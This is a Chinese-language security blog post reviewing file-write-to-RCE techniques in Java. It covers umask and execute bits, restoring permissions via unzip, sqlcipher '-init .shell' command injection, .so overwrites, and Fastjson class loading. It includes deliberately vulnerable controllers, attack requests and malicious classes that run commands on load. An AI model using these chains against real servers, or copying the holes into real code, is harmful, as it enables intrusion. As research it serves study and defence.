#  近期针对 Java 环境下写文件RCE回顾  
原创 Heihu577
                        Heihu577  Heihu Share   2026-04-21 03:05  
  
# 近期针对 Java 环境下写文件 RCE 回顾  
  
- 文件写入丢失标志位问题  
- 文件写入 RCE  
- 文件上传 RCE  
- 利用 unzip 恢复标志位  
- 第三方应用 RCE 思路  
- SpringBoot 下覆盖 so 文件  
- FastJson_noneautotype  
- 版本变更说明  
- 恶意类加载方式  
- Fastjson autotype 版本  
- Servlet 案例  
- SpringBoot 案例  
- Ending...  
## 文件写入丢失标志位问题  
  
假设存在如下代码:  
```
package com.heihu577.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

@RestController
@RequestMapping("/file")
public class FileController {

    // 原有的 writeFile 方法（保留）
    @RequestMapping("/writeFile")
    public String writeFile(String filename, String content) throws Exception {
        File file = new File(filename);
        try (FileOutputStream fileOutputStream = new FileOutputStream(file)) {
            fileOutputStream.write(content.getBytes());
            fileOutputStream.flush();
        }
        return "WriteFile OK";
    }

    // 原有的 exec 方法（保留）
    @RequestMapping("/exec")
    public String exec() throws Exception {
        Process exec = Runtime.getRuntime().exec("./cmd.sh");
        InputStream inputStream = exec.getInputStream();
        Scanner scanner = new Scanner(inputStream);
        scanner.useDelimiter("\0");
        return scanner.next();
    }

    /**     * 【高危漏洞】任意文件上传     * 攻击者可利用路径遍历（../）将文件写入任意目录，覆盖系统文件或上传Webshell     * @param file 上传的文件     * @param savePath 保存路径（相对路径或绝对路径，允许目录遍历）     * @return 上传结果     */
    @RequestMapping("/upload")
    public String uploadFile(@RequestParam("file") MultipartFile file,                             @RequestParam(value = "path", defaultValue = "./") String savePath) {
        try {
            // 漏洞点：直接拼接用户传入的路径，未做任何安全检查
            String fileName = file.getOriginalFilename();
            // 防御性过滤（实际没有，完全信任用户输入）—— 这里故意不校验
            Path targetPath = Paths.get(savePath, fileName).normalize();
            File dest = targetPath.toFile();
            if(dest.exists()){
                dest.delete();
            }
            // 写入文件
            file.transferTo(dest);
            return "Upload success: " + dest.getAbsolutePath();
        } catch (Exception e) {
            e.printStackTrace();
            return "Upload failed: " + e.getMessage();
        }
    }
}

```  
  
乍一看通过/file/writeFile  
或/file/upload  
进行覆盖cmd.sh  
都可以实现 RCE, 但事实是这样吗？  
### 文件写入 RCE  
  
如果 cmd.sh 文件本身就存在, 且本身存在 x 权限  
, 那么可以利用 writeFile 和 exec 接口进行实现 RCE:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mS3YhqKWBR0EajUrpOyRIzjuGJvcMCR8icKseYz7ZXHacBNLQVDWyNNh0ajExmyqACYX9NicxykacEdNDNt4UTeBwMVbhEOYpxDjG0KluYeJg/640?wx_fmt=png&from=appmsg "")  
  
但如果该文件不存在  
或标志位不存在 x  
, 那么通过 writeFile 和 exec 则无法进行 RCE:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR3jLd2qJK9gqKribz0ibxHArvC4o8RS2wgxmhXvJYW92kTP6c4m75BTMJCUrC4wdYMPqkUibvGb5PcThicTxQjuaelr8CKPZHbL85w/640?wx_fmt=png&from=appmsg "")  
#### 新建文件机制分析  
  
首先看一下 FileOutputStream 的构造方法:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR2ED3uvrR70loOEK8M6DmfARWxHbTJehJuRnmt9Vef6uPPN35ticLq4TVicAWkGKdQNsXOhPlEMcNSVIMspBUfopnMZafqmcicFbo/640?wx_fmt=png&from=appmsg "")  
  
最终会调用 FileOutputStream::open0 方法进行打开文件, 对应的 JNI 我们可以通过:  
- https://github.com/openjdk/jdk17/blob/master/src/java.base/unix/native/libjava/FileOutputStream_md.c  
  
- https://github.com/openjdk/jdk17/blob/master/src/java.base/unix/native/libjava/io_util_md.c  
  
来看到对应的过程:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR0CXUUcOQEUJs6PJbLqNyI3NuxTtboZ7rG0iaZZOGNcNxvicjaAn99Nfibiatc3zDYxsXNX3SwkcRpxRfbyuLwhGnmTL9qZSmeRHP0/640?wx_fmt=png&from=appmsg "")  
  
这里调用 handleOpen 时, mode （新建文件时）硬编码为了 0666, 而 flags 是通过 FileOutputStream 追加或新建文件时计算而来的, 在 Linux 内核 https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/fcntl.h 中各个含义如下:  
```
#define O_RDONLY    00000000    /* 只读打开，八进制 00000000 = 十进制 0 */
#define O_WRONLY    00000001    /* 只写打开（在 FileOutputStream 中参与了或运算），八进制 00000001 = 十进制 1 */
#define O_RDWR      00000002    /* 读写打开，八进制 00000002 = 十进制 2 */
#define O_CREAT     00000100    /* 若文件不存在则创建（在 FileOutputStream 中参与了或运算），八进制 00000100 = 十进制 64 */
#define O_TRUNC     00001000    /* 若文件存在则截断为0（将文件长度截断为 0 也就是文件存在时append 为 false 直接清空文件内容），八进制 00001000 = 十进制 512 */
#define O_APPEND    00002000    /* 追加模式写入，八进制 00002000 = 十进制 1024 */

```  
  
在上述定义中, 只有 O_CREAT  
 会触发权限设置, 其他标志位（O_TRUNC  
、O_APPEND  
、O_WRONLY  
）只影响文件内容或访问方式，不改变文件属性。  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">标志位</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">作用</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">是否影响权限</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><code><span leaf="">O_WRONLY</span></code></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">只写模式</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">❌ 不影响</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><code><span leaf="">O_CREAT</span></code></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">文件不存在时创建</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">✅ </span><strong style="font-weight: bold;color: black;"><span leaf="">唯一影响权限</span></strong></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><code><span leaf="">O_TRUNC</span></code></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">截断文件内容为 0</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">❌ 不影响</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><code><span leaf="">O_APPEND</span></code></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">追加写入</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">❌ 不影响</span></section></td></tr></tbody></table>  
其中这是根据 FileOutputStream 的值调用到最终 JNI 参数中的 open 方法的过程 (也就是 flags, flags 是指打开模式), 而当新建一个文件时这个文件的权限是由 mode 指明的, 它会影响系统中 umask 的计算, 其中计算过程如下:  
```
┌─────────────────────────────────────────────────────────────────┐
│  Java 层                                                        │
├─────────────────────────────────────────────────────────────────┤
│  new FileOutputStream("test.txt")                              │
│         │                                                       │
│         ▼                                                       │
│  open0(path, append)                                           │
└─────────────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│  JNI 层                                                         │
├─────────────────────────────────────────────────────────────────┤
│  Java_java_io_FileOutputStream_open0(env, this, path, append)  │
│         │                                                       │
│         │  flags = O_WRONLY | O_CREAT | O_APPEND/O_TRUNC       │
│         ▼                                                       │
│  fileOpen(env, this, path, fos_fd, flags)                      │
│         │                                                       │
│         │  mode = 0666  ← 硬编码！                              │
│         ▼                                                       │
│  handleOpen(path, flags, 0666)                                  │
│         │                                                       │
│         │  RESTARTABLE 宏 → 处理信号中断                        │
│         ▼                                                       │
│  open(path, flags, 0666)  ← 系统调用                            │
└─────────────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│  内核层                                                         │
├─────────────────────────────────────────────────────────────────┤
│  sys_open()                                                    │
│         │                                                       │
│         ▼                                                       │
│  mode = 0666 & ~umask = 0666 & ~0022 = 0644                    │
│         │                                                       │
│         ▼                                                       │
│  创建文件，权限 = 0644 (rw-r--r--)                              │
└─────────────────────────────────────────────────────────────────┘

```  
  
这里实际上我们可以通过如下命令来体验到这个过程:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mS3YhqKWBR0oLS4YvceaKia7KthDPpYLWWlrXicR4A69qWtSYQaZSs7pHicDyg2zdQ5UnsMB3FtDicZzIyvQZPXmJibQAQ6HOnYtmQeG0xF3dHw4/640?wx_fmt=png&from=appmsg "")  
  
对应的案例可以参考: https://web.eecs.utk.edu/~jplank/plank/classes/cs360/360/notes/Umask-And-Others/  
  
国内的菜鸟教程: https://www.runoob.com/linux/linux-comm-umask.html  
#### 打开文件能够 RCE 原因  
  
当系统内核使用 O_CREAT 来创建一个新文件时, 内核自动应用 umask, 从而导致新建的文件权限受到了影响:  
```
 open(O_CREAT) → 文件不存在 → 创建新文件
                              ↓  
                    内核：mode & ~umask 
                              ↓
                         设置文件权限                              

```  
  
但当文件存在时, O_CREAT 是不会生效的（文件不存在时则创建）, 所以是不会应用mode & ~umask  
来篡改文件权限标志位的, 我们可以参考官方文档: https://man7.org/linux/man-pages/man2/open.2.html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR2mDsE1npicoH1Dc1je8hOmcQDwxkibN56j6FmrQhnvcOLHBSXkHPGzLaAqWNu7n0PwxgrrB5ic4gggLRys9ygcBVSc6bcFOb1Y5M/640?wx_fmt=png&from=appmsg "")  
  
因此在打开一个文件时实际上是不会影响到一个文件的标志位的.  
### 文件上传 RCE  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR1RA2IQjlQHRTficDpBNhvQuFgJcTtMCUGHGWNCRttFCmb9tOpvt187ckRtENAAQwCULfMqJMEBoibBH4uIcSriayvRvTbtklkMP4/640?wx_fmt=png&from=appmsg "")  
#### 失败原因分析  
  
这里为什么会失败呢？实际上原因也不难, 在 https://mp.weixin.qq.com/s/PDo9MRUnKCdtDNwxUytzNA Spring 下临时文件保留方法中我们曾体会过 SpringBoot 的机制, 当一次文件上传的 HTTP 请求打到 SpringBoot 服务端时服务端会在org.apache.tomcat.util.http.fileupload.FileUploadBase::parseRequest  
方法中进行处理本次文件上传请求:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mS3YhqKWBR2UMSJ9LJBWkeWD43JR3VibjGLKeNfcgm3uiaH2lCrK2Ynt1yNGOUFXJYa5AZbp199lHfRibcp3NRVco6nO8HY877Y2C0W4IC29J4/640?wx_fmt=png&from=appmsg "")  
  
生成的临时文件显然涉及到了底层的 open0 方法, 从而触发了 O_CREAT 逻辑, 导致创建的临时文件不带 x 权限:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR2t7UFWWyrqP1erfHSYzQkKJKpG5St7iaUIF3rUfLtYEibQlyBXzkqnB0fcyVhXF2K0L5TOvUcru7lD21As85V2ibjPWnRlOO9b4A/640?wx_fmt=png&from=appmsg "")  
  
而由于底层是通过移动该文件实现的文件上传:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR3MTxpXCpGVsMWRDriamUyEVHtDCHZsSHlcsDNaQsnryz9KnNhxSPiaDdibZBpvXzpJ6YBnpwgLLTFANWiavxqcQnjmRZ6qMwVc4OM/640?wx_fmt=png&from=appmsg "")  
  
导致标志位实际上是 SpringBoot 创建临时文件的标志位（不带 x 权限）. 所以无法进行 RCE.  
### 利用 unzip 恢复标志位  
  
在实战中遇到了 unzip 恢复标志位的场景, 假设存在这样的环境:  
```
package com.heihu577.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

@RestController
@RequestMapping("/file")
public class FileController {

    // 原有的 writeFile 方法（保留）
//    @RequestMapping("/writeFile")
//    public String writeFile(String filename, String content) throws Exception {
//        File file = new File(filename);
//        try (FileOutputStream fileOutputStream = new FileOutputStream(file)) {
//            fileOutputStream.write(content.getBytes());
//            fileOutputStream.flush();
//        }
//        return "WriteFile OK";
//    }

    // 原有的 exec 方法（保留）
    @RequestMapping("/exec")
    public String exec() throws Exception {
        Process exec = Runtime.getRuntime().exec("./cmd.sh");
        InputStream inputStream = exec.getInputStream();
        Scanner scanner = new Scanner(inputStream);
        scanner.useDelimiter("\0");
        return scanner.next();
    }

    /**     * 【高危漏洞】任意文件上传     * 攻击者可利用路径遍历（../）将文件写入任意目录，覆盖系统文件或上传Webshell     * @param file 上传的文件     * @param savePath 保存路径（相对路径或绝对路径，允许目录遍历）     * @return 上传结果     */
    @RequestMapping("/upload")
    public String uploadFile(@RequestParam("file") MultipartFile file,                             @RequestParam(value = "path", defaultValue = "./") String savePath) {
        try {
            // 漏洞点：直接拼接用户传入的路径，未做任何安全检查
            String fileName = file.getOriginalFilename();
            // 防御性过滤（实际没有，完全信任用户输入）—— 这里故意不校验
            Path targetPath = Paths.get(savePath, fileName).normalize();
            File dest = targetPath.toFile();
            if(dest.exists()){
                dest.delete();
            }
            // 写入文件
            file.transferTo(dest);
            return "Upload success: " + dest.getAbsolutePath();
        } catch (Exception e) {
            e.printStackTrace();
            return "Upload failed: " + e.getMessage();
        }
    }

    @RequestMapping("/zip")
    public String zip(String zipFile, String dstDir) throws Exception {
        Process exec = Runtime.getRuntime().exec("./zip.sh " + zipFile + " " + dstDir);
        InputStream inputStream = exec.getInputStream();
        Scanner scanner = new Scanner(inputStream);
        scanner.useDelimiter("\0");
        return scanner.next();
    }
}

```  
  
其中 cmd.sh 不带 x 权限, 我们现在想要通过 /file/zip 接口来恢复 cmd.sh 的执行权限, 其中系统自带的 zip.sh 文件内容是这样的:  
```
unzip -o -q $1 -d $2

-o：覆盖已存在的文件，不进行提示。
-q：安静模式（quiet），不输出解压过程中的详细信息。
$1：脚本的第一个参数，代表要解压的 ZIP 文件的路径。
-d $2：指定解压目标目录，$2 是脚本的第二个参数，代表解压到的目录。

```  
  
并且该文件存在执行权限, 因此我们可以利用该接口来恢复权限. 服务端环境假设为:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR1ABgtOW6icWqROB54GVXfLSZJMDa4aTKndUAib4ZW6FgeEBGKQDMsviahcGGCewYkicmOkDmIclf87ic3BPeiaZEtc6oO5kTNXPk9EE/640?wx_fmt=png&from=appmsg "")  
  
随后攻击者创建一个压缩包:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mS3YhqKWBR1P3Ty0icZiagQH1ARJCTibgicogINurvEP4CnFQz2aumm46BHKmjeue8mRIclLrYsZZtqgDZnSsq6FEq0hWahyqiaYTZnhSN6Ka1JU/640?wx_fmt=png&from=appmsg "")  
  
其中 cmd.sh 文件内容如:  
```
whoami > ./1.txt

```  
  
随后通过文件上传接口将该 ZIP 包上传到服务端中 (本步骤过程忽略), 上传完毕后访问 /file/zip 来进行解压缩:  
```
POST /file/zip HTTP/1.1
Host: 192.168.16.245:3838
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 156

zipFile=/Users/heihu577/Desktop/最近攻防小知识汇总/code/tricks/temp/cmd.zip&dstDir=/Users/heihu577/Desktop/最近攻防小知识汇总/code/tricks/

```  
  
最终解压缩结果:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mS3YhqKWBR2E5sIliblkRnahgaz2ovBV4EwJe0EtXYIuSwmM2KtmTSjp97WOwb8I25nmnaiccya1Z95a1UALoSHGgVatDmO2WG6gc6coJbPqE/640?wx_fmt=png&from=appmsg "")  
  
cmd.sh 标志位被恢复了, 那么可以调用 /file/exec 接口执行:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mS3YhqKWBR0AWgpMJcSDJPwqBwtoxhkQX2yq9aaUwt0GfWZlOSVnWGD3gnke5Tx5oWANzgbeGxcrByscaWicF2N5P8666Glq6mH9kOlqqVo8/640?wx_fmt=png&from=appmsg "")  
### 第三方应用 RCE 思路  
  
上述 .sh 文件中的 RCE 思路已经说明了, 另一些 RCE 思路则是第三方应用例如 sqlcipher: https://github.com/sqlcipher/sqlcipher  
  
比如存在 sqlcipher.sh 并且 java 应用程序对其进行调用:  
```
echo "start sqlcipher:";
echo "source sqlite:$1";
echo "target sqlite:$2";
sqlcipher -cmd "PRAGMA key = 'AAABBBCCC';ATTACH DATABASE '$2' AS plaintext KEY '';SELECT sqlcipher_export('plaintext');DETACH DATABASE plaintext;" $1
exit 1

```  
  
这里明显 $1 可以传递任意参数, 这里的思路则是 sqlcipher 这个第三方应用程序是否存在能执行命令的点, 最终发现 init 参数可以执行命令:  
```
sqlcipher encrypted.db -cmd "PRAGMA key='your-passphrase';" -init init.sql
-- Loading resources from init.sql
root

```  
  
其中 init.sql 文件内容如:  
```
.shell whoami

```  
  
因此这里显然存在命令注入, 而基于 sqlcipher.sh 文件可以这样 RCE:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR29ROH9WtpzQcEwaCnGRe6FtF35yVjaCooIOnaq2FpDPmictxmZsU19G5ZWRkia3XKKESJ0ch1pxnKOdOyYLeYkoP9VL0FdPFxFo/640?wx_fmt=png&from=appmsg "")  
## SpringBoot 下覆盖 so 文件  
  
实际上在 JDK8 中可以覆盖 charsets.jar 等 jar 包进行 RCE, 由于 JDK8 以上版本使用了模块化无法进行覆盖 jar 文件达到 RCE 的效果了, 但高版本中可以覆盖 so 文件进行 RCE.  
  
在之前覆盖 jar 包的姿势想要突破 JDK 版本号的限制只能通过写入 tomcat-docbase 的字节码, 随后通过 Class.forName(类名,true,Thread.currentThread().getContextClassLoader())  
获取到 Tomcat 的类加载器达到加载 SpringBoot 内置的 Tomcat 加载器加载恶意类/WEB-INF/classes/具体类  
的效果. 不过这种写入需要爆破 tomcat-docbase 的目录名称, 并且需要创建目录权限.  
  
而在高版本 JDK 中 珂字辈 师傅发现了覆盖 so 文件的姿势, 具体可以参考: https://mp.weixin.qq.com/s/NrNFwEfNbqGKd5jUSe-4eA 以及 https://mp.weixin.qq.com/s/NrNFwEfNbqGKd5jUSe-4eA  
  
经过实际测试, 发现该姿势在 JDK 17 环境下同样很猛, 由于覆盖的 so 文件有些类可以实现 JNI, 因此可以通过 JNI 来调用 JAVA 代码来实现执行内存马的操作. 只要系统运行 jar 包的权限足够大, 那么就可以通过覆盖或新增特定的 so, 只需要简单的Class.forName  
即可进行 RCE（无需特定的 ClassLoader）.  
## FastJson_noneautotype  
  
这里以 fastjson 为例, 来说明一下类加载机制, 实际上不同的 WEB 类加载方案是不同的.  
### 版本变更说明  
  
Noneautotype 版本直接通过拦截 checkAutoType 方法禁止了所有 @type:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR3DwGEic3k9JDLu8TI50jJgMBNDSkMm0OStDr4YeQgDaWg2tu8wNzy7nCoNSpo9m6mu4M38wwa5kkxsd7W0t7iaCRof88z2XgC3c/640?wx_fmt=png&from=appmsg "")  
### 恶意类加载方式  
  
理论上所有尝试类加载的行为都会被 BAN, 但实际上针对于白名单的类不会被 BAN 掉（第二个参数传递具体的类名）:  
```
package com.heihu577.MyBean;

import com.alibaba.fastjson.JSONObject;

public class T1 {
    public static void main(String[] args) {
        Test test = JSONObject.parseObject("{\"@type\":\"com.heihu577.MyBean.Test\"}", Test.class);
        System.out.println(test); // {}
    }
}

```  
  
假设我们存在任意文件写入的权限, 这种处理机制我们能否进行写入恶意字节码来进行 RCE？  
#### SpringBoot tomcat-docbase（失败）  
  
如果写入到 SpringBoot tomcat-docbase 目录下, JDK 会不会因为类加载机制导致成功加载到我们放置的字节码呢？  
  
准备如下控制器:  
```
package com.heihu577.controller;

import com.alibaba.fastjson.JSONObject;
import com.heihu577.MyBean.Test;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/fastjson")
public class fastjsonController {
    @RequestMapping("/loadClass")
    public String loadClass(@RequestBody String json) {
        JSONObject.parseObject("{\"@type\":\"com.heihu577.MyBean.Test\"}", Test.class);
        return "OK";
    }
}

```  
  
随后自己本地手动创建 tomcat-docbase目录/WEB-INF/classes/com/heihu577/MyBean/Test.class 恶意字节码:  
  
其中tomcat-docbase目录  
下断点获取一下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mS3YhqKWBR2RlCEB3eX54CrQDqXElcYUEJWSDCiaic1SRzgTiblUxrbNWDInokZvgic3NrdooR54fJfcWembMpnzIEmWRaSpsJIYU10pXPkjj40/640?wx_fmt=png&from=appmsg "")  
  
写入字节码:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR0A0A9ZpuvszWkNfI87DrmKwcl1UuJwJdcnqjkQOKm8t4PhLDHAnm4iahhfOXJ2TUPPaHgANh4fmVBm36WJ9vcsNVEP2e19ClyQ/640?wx_fmt=png&from=appmsg "")  
  
字节码反编译源码:  
```
public class Test extends HashMap {
    public String name;

    public static void main(String[] args) {
        System.out.println("OK");
    }

    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}

```  
  
加载发现无法弹窗（失败）:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR387Sf9Ljn3jE56VEyK8icg0Leiaja035IerpVJzlMBDmfjibAibFRuXFVyOZw4dBQJggjFGTsAicu9ciaFDWk06KbN3o56YuFia6OraQ/640?wx_fmt=png&from=appmsg "")  
  
原因是 SpringBoot 内置的 Tomcat 遵循了 JDK 的双亲委派:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mS3YhqKWBR12btpxnn60dPUKSFkwW9Voibg9f2gjHRne2H9iamfl4y3jxv8CeZ8qjOfmYFOeSmIlSA0fWcKRJ7rIib9fHqtYP6bwDZy3zh2ibKc/640?wx_fmt=png&from=appmsg "")  
  
因此 WebappClassLoader 的父加载器加载过, 则直接返回父加载器加载过的类.  
#### Servlet WEB-INF/classes 加载（理论利用）  
  
但 Tomcat 的 Delegate 实际上默认为 false, 写字节码的思路能否运用在 Tomcat 上呢？创建一个 Servlet 项目, 并且定义如下代码:  
```
package com.heihu577.servlet;

import com.alibaba.fastjson.JSONObject;
import com.heihu577.MyBean.Test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet("/fastjson")
public class fastjsonServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Test test = JSONObject.parseObject("{\"@type\":\"com.heihu577.MyBean.Test\"}", Test.class);
        resp.getWriter().println(test);
    }
}

```  
  
会先去/WEB-INF/classes  
目录寻找com.heihu577.MyBean.Test  
类, 但是如果覆盖/WEB-INF/classes  
中的com.heihu577.MyBean.Test  
类是否可以进行 RCE 呢？  
  
实际上也不行, 因为当类的字节码加入到内存之后, 不会再去磁盘中进行再一次的加载, 这也就是双亲委派中的缓存机制.  
```
┌─────────────────────────────────────────────────────────────┐
│  ClassLoader 加载流程                                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  loadClass("com.example.MyClass")                           │
│         │                                                   │
│         ▼                                                   │
│  检查缓存：已加载？                                          │
│         │                                                   │
│    ┌────┴────┐                                              │
│    ↓         ↓                                              │
│   是        否                                              │
│    │         │                                              │
│    ▼         ▼                                              │
│  返回缓存   读取字节码                                       │
│  的 Class   加载并缓存                                       │
│  对象       返回新 Class                                     │
│                                                             │
│  ✅ 成功加载 → 缓存 Class 对象                               │
│  ❌ 再次加载 → 返回缓存的同一个对象                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘

```  
  
除非该类没有加入内存之前调用 loadClass, 但通常业务系统都已经运行了很久, 按照开发这样的写法在实战中能使用上的概率比较小.  
> 理论上在 Servlet 场景的任意文件上传可选项也比较多, 也大可不必写入 class 字节码, 通常可以选择: jsp, war 自动部署, web.xml 进行 RCE 等...  
  
## Fastjson autotype 版本  
  
如果在 fastjson 普通版本:  
- Servlet WEB-INF/classes 类加载的思路可行（原因是可以写入任意类名,只要确保写入的类名没有被首次加载过即可）, 我们可以往该目录写入以 @JSONType 注解的类, 随后再使用 FastJson 进行类加载即可.  
  
- SpringBoot tomcat-docbase 思路可行（原因是可以写入任意类名,只要确保写入的类名不在 AppClassLoader 等中出现过即可）,我们可以往该目录写入以 @JSONType 注解的类, 随后再使用 FastJson 进行类加载即可.  
  
### Servlet 案例  
```
package com.heihu577.servlet;

import com.alibaba.fastjson.JSONObject;
import com.heihu577.MyBean.Test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet("/fastjson")
public class fastjsonServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Test test = JSONObject.parseObject("{\"@type\":\"com.heihu577.MyBean.Test\"}", Test.class);
        resp.getWriter().println(test);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String json = req.getParameter("json");
        JSONObject jsonObject = JSONObject.parseObject(json);
        resp.getWriter().println(jsonObject);
    }
}

```  
  
在 doPost 中可以加载任意 json 串, 因此我们可以在 WEB-INF/classes 目录中写入任意字节码, 比如如下字节码:  
```
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.heihu577.MyBean;

import com.alibaba.fastjson.annotation.JSONType;
import java.io.IOException;

@JSONType
public class Evil2 {
    static {
        try {
            Process var0 = Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}

```  
  
将字节码写入:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR0FJbK15fibtb7W9m86eOomibVjYmj0IT9rVYUcGKcJdib76t4gHKqHiaRGj3VTkMdRgBukV6SSQviaQgZia8FIpcKgBronxUTzocab4/640?wx_fmt=png&from=appmsg "")  
  
随后加载:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mS3YhqKWBR2sn50iaZv8Bz4ksYXicvEA1BfcgXv5WCKlXRmPDaxib3h8ErBEAVeicptYsBZTNjgmyib0xxWwA4HFiaicPEHPB3LVPlh6FaZBozScZQ/640?wx_fmt=png&from=appmsg "")  
### SpringBoot 案例  
  
这里不再重复演示, 参考SpringBoot 之殇  
的方法即可. 原理和上述的 Servlet 案例相同.  
## Ending...  
  
  
  
